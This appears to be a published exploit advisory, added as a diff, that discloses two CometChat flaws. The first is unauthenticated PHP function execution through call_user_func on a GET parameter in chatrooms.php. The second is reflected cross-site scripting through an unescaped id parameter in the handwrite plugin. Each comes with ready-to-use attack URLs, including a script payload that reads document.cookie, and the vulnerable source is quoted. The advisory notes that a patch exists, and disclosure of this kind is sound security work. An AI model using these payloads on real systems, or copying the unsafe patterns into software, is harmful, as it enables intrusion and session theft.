@@ -1,0 +1,32 @@
+##################################################################################
+       __            _                      _            ____            
+      / /___ _____  (_)_____________ ______(_)__  _____ / __ \_________ _
+ __  / / __ `/ __ \/ / ___/ ___/ __ `/ ___/ / _ \/ ___// / / / ___/ __ `/
+/ /_/ / /_/ / / / / (__  |__  ) /_/ / /  / /  __(__  )/ /_/ / /  / /_/ / 
+\____/\__,_/_/ /_/_/____/____/\__,_/_/  /_/\___/____(_)____/_/   \__, /  
+                                                                /____/   
+##################################################################################																
+Cometchat chat Application All Version Multiple Vulnerabilities
+Cometchat is a chat application which in use Vbulletin,Xenforo,SMF,MyBB and other integrated scripts
+App Homepage : http://www.cometchat.com
+
+Author(Pentester): B127Y
+Special Thanks : Burtay and All Janissaries Team(Burtay,Miyachung,3spi0n,TheMirkin,Michelony,Mectruy)
+Jani Exploit id 1 (http://www.janissaries.org/exploits/1)
+##################################################################################
+
+# Exploit-DB Note 20-02-2013:
+# A security patch appears to have been released to address the issue:
+# http://www.cometchat.com/blog/cometchat-critical-security-update/
+
+1.)Code Execution P0C (modules/chatrooms/chatrooms.php)
+call_user_func call_user_func($_GET['action']); 
+Can use all php functions and cometchat function without arguments
+
+Live Demo:http://server/cometchat/modules/chatrooms/chatrooms.php?action=phpinfo
+
+2.)XSS P0C (plugins/handwrite/index.php)
+echo echo <<<EOD  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  <html>  <head>  <title>{$handwrite_language[0]}</title>   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>     <style>  html, body, div, span, applet, object, iframe,  h1, h2, h3, h4, h5, h6, p, blockquote, pre,  a, abbr, acronym, address, big, cite, code,  del, dfn, em, font, img, ins, kbd, q, s, samp,  small, strike, strong, sub, sup, tt, var,  dl, dt, dd, ol, ul, li,  fieldset, form, label, legend,  table, caption, tbody, tfoot, thead, tr, th, td {   margin: 0;   padding: 0;   border: 0;   outline: 0;   font-weight: inherit;   font-style: inherit;   font-size: 100%;   font-family: inherit;   vertical-align: baseline;      text-align: center;  }    html {    height: 100%;    overflow: hidden; /* Hides scrollbar in IE */  }    body {    height: 100%;    margin: 0;    padding: 0;  }    #flashcontent {    height: 100%;  }      </style>      </style>    </head>  <body><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"          codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0"          width="100%"          height="100%"          align="middle"          id="main">      <param name="allowScriptAccess" value="sameDomain" />      <param name="movie" value="handwriting.swf" />      <param name="quality" value="high" />      <param name="bgcolor" value="#ffffff" />      <param name="FlashVars" value="tid={$toId}" />       <param name="scale" value="exactFit" />      <embed src="handwriting.swf"             width="100%"             height="100%"             autostart="false"             quality="high"             bgcolor="#ffffff"             FlashVars="tid={$toId}"             name="main"             align="middle"             allowScriptAccess="sameDomain"             type="application/x-shockwave-flash"             pluginspage="http://www.macromedia.com/go/getflashplayer" />  </object></body>  </html>  EOD; 
+$toId = $_GET['id']; 
+
+Live Demo:http://server/cometchat/plugins/handwrite/index.php?id="><script>alert(document.cookie)</script>
